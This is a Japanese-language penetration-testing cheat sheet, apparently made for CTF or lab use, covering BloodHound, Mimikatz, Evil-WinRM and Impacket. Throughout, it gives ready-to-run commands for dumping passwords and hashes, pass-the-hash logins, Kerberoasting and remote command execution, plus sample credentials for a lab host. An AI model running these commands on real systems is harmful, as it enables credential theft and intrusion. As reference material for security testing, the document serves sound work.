
# 目次
1. [BloodHound](#bloodhound)
2. [Mimikatz](#mimikatz)
3. [Evil-WinRM](#evil-winrm)

---

## BloodHound

BloodHound ([GitHubリンク](https://github.com/BloodHoundAD/BloodHound)) は、グラフ理論に基づきActive Directory環境の意図しない関係性を明らかにするためのツールです。これにより、低特権ユーザーをDomain Adminsに昇格させるためのパスを発見することができます。詳細については、[Qiita記事](https://qiita.com/v_avenger/items/56ef4ae521af6579c058)をご覧ください。

### 操作手順

1. **ターゲットAD上でSharpHound.exeを実行する**
   - SharpHoundは、Active Directoryの情報を収集し、関係性を解析するツールです。
   
2. **作成された日付入りのzipファイルをKali上に転送する**
   - ファイルを転送するには、`scp`や`ftp`などのツールを使用します。

3. **neo4jの起動**
   - BloodHoundはNeo4jデータベースを使用してグラフデータを管理します。

4. **BloodHoundの起動**
   - Neo4jが起動したら、BloodHoundを実行し、収集したデータをアップロードします。

---

## Mimikatz

Mimikatzは、Windowsシステムのパスワードやハッシュをダンプするためのツールです。

### 基本コマンド

- **パスワードとハッシュのダンプ**

  ```bash
  privilege::debug
  sekurlsa::logonpasswords
  ```

- **SAMとLSAのダンプ**

  ```bash
  lsadump::sam
  lsadump::lsa /patch
  ```

- **ワンライナーでの実行**

  ```bash
  .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
  ```

  ![Mimikatz Example](https://github.com/user-attachments/assets/80751d7c-e8fe-4d86-a690-98426942fdff)

---

## Evil-WinRM

WinRM（Windows Remote Management）は、MicrosoftのWS-Management Protocolの実装です。リモートシェルプログラムとしてEvil-WinRMを使用することで、WinRMサービスが有効なリモートWindowsサーバーに接続できます。

### WinRMサービスの発見

- **ポート5985（平文プロトコル）および5986（暗号化されたプロトコル）のスキャン**

  ```bash
  nmap -p5985,5986 <IP>
  ```

### ログイン方法

- **パスワードでログイン**

  ```bash
  evil-winrm -i <IP> -u user -p pass
  evil-winrm -i <IP> -u user -p pass -S
  ```

- **ハッシュでログイン**

  ```bash
  evil-winrm -i <IP> -u user -H ntlmhash
  ```

- **キーでログイン**

  ```bash
  evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S
  ```

### ログの表示

- **ログ表示**

  ```bash
  evil-winrm -i <IP> -u user -p pass -l
  ```

### ファイルのアップロードとダウンロード

- **ファイルのアップロード**

  ```bash
  upload <file>
  ```

- **ファイルのダウンロード**

  ```bash
  download <file> <filepath-kali>
  ```

- **Kaliから直接ファイルを読み込む**

  ```bash
  evil-winrm -i <IP> -u user -p pass -s /opt/privsc/powershell
  ```

### Evil-WinRMコマンド

- **コマンドメニューの表示**

  ```bash
  menu
  ```

- **バイナリの実行**

  ```bash
  evil-winrm -i <IP> -u user -p pass -e /opt/privsc
  Invoke-Binary /opt/privsc/winPEASx64.exe
  ```


- **パスワードログイン例**

  ```bash
  evil-winrm -i 10.10.11.14 -u maya -p 'm4y4ngs4ri'
  ```

  ![Password Login](https://github.com/user-attachments/assets/7020f363-a6ca-46b9-9f53-37b00809c45a)

- **ハッシュ値によるログイン例**

  ```bash
  evil-winrm -i 10.10.11.14 -u localadmin -H 9aa582783780d1546d62f2d102daefae
  ```

  ![Hash Login](https://github.com/user-attachments/assets/422c7f6c-7d6a-47ae-a374-947c13d39b0b)

  ![Example](https://github.com/user-attachments/assets/764171ae-cf49-4710-95a5-508452d37fe3)


## Impacket

Impacketは、Pythonで書かれたネットワークプロトコルライブラリで、Windowsネットワークに関連する様々なプロトコルやサービスを操作するためのツール群を提供します。主にネットワークセキュリティ評価やペネトレーションテスト、フォレンジック分析に使用されます。

## 主なツール

1. **smbclient**: SMBプロトコルを使用してWindows共有にアクセスするためのクライアントツール。
   
   ```bash
   smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address]
   ```

2. **smbserver**: SMBプロトコルを使用してファイル共有を提供するサーバーツール。

3. **wmiexec**: Windows Management Instrumentation（WMI）を使用してリモートでコマンドを実行するツール。
   
   ```bash
   wmiexec.py [domain]/[user]:[password/password hash]@[Target IP Address]
   wmiexec.py -hashes lmhash:nthash [domain]/[user]@[Target IP Address]
   ```

4. **mimikatz**: Windows認証情報の収集や操作を行うツール（Impacketに含まれています）。

5. **ntlmrelayx**: NTLM認証を中継し、リモートシステムへのアクセス権を取得するのを支援するツール。

## コマンド例

### ユーザーおよびサービスの列挙

- **ユーザー列挙**

  ```bash
  lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address]
  ```

- **サービス列挙**

  ```bash
  services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action]
  ```

### ハッシュのダンプ

- **ハッシュダンプ**

  ```bash
  secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]
  ```

- **Kerberoasting**

  ```bash
  GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request
  ```

- **AS-REP Roasting**

  ```bash
  GetNPUsers.py [domain]/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt
  ```

### リモートコマンド実行（RCE）

- **psexec**

  ```bash
  psexec.py [domain]/[user]:[password]@[Target IP Address]
  psexec.py -hashes lmhash:nthash [domain]/[user]@[Target IP Address]
  ```

- **wmiexec**

  ```bash
  wmiexec.py [domain]/[user]:[password]@[Target IP Address]
  wmiexec.py -hashes lmhash:nthash [domain]/[user]@[Target IP Address]
  ```

- **smbexec**

  ```bash
  smbexec.py [domain]/[user]:[password]@[Target IP Address]
  smbexec.py -hashes lmhash:nthash [domain]/[user]@[Target IP Address]
  ```

- **atexec**

  ```bash
  atexec.py [domain]/[user]:[password]@[Target IP Address] <command>
  atexec.py -hashes lmhash:nthash [domain]/[user]@[Target IP Address] <command>
  ```


このMarkdown形式のドキュメントで、各ツールの使い方とコマンド例が体系的に整理されています。必要に応じて、具体的なコマンドや操作方法を追加するとさらに役立つでしょう。